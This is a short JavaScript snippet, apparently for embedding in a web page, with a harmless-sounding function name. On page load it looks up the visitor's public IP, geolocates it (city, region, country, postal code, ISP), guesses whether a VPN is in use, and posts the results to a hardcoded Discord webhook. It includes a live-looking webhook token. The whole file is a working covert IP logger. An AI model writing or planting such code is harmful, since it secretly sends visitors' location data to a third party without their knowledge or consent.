function ShieldInfo() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            return fetch(`https://ipwhois.app/json/${ip}`);
        })
        .then(response => response.json())
        .then(geoData => {
            const vpnStatus = geoData.connection_type === "Corporate" || geoData.isp.toLowerCase().includes("vpn") 
                ? `Yes (Double Check: ${geoData.isp})` 
                : `No (Double Check: ${geoData.isp})`;

            const payload = {
                content: `**User IP:** ${geoData.ip}\n**ISP:** ${geoData.isp}\n**Location:** ${geoData.city}, ${geoData.region}, ${geoData.country}\n**Postal Code:** ${geoData.zip}\n**IsVPN?** ${vpnStatus}`,
                username: `Visitor from ${geoData.country}`,
                avatar_url: "https://cdn.xoa.me/uploads/611e43ef-ba96-4914-aa7c-a1c85149415b.jpg"
            };

            return fetch("https://discord.com/api/webhooks/1432349756444639354/7k1eRwoMwZOCdXmC0W8oQf7yHpYgLBirccHzW5cfvP3HguMWWQ_0F78OnFsub2Omx6VP", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
        })
        .then(response => response.json())
        .then(result => {
            console.log('IP & Geo Info Logged:', result);
        })
        .catch(error => {
            console.error('Error:', error);
        });
}

ShieldInfo();
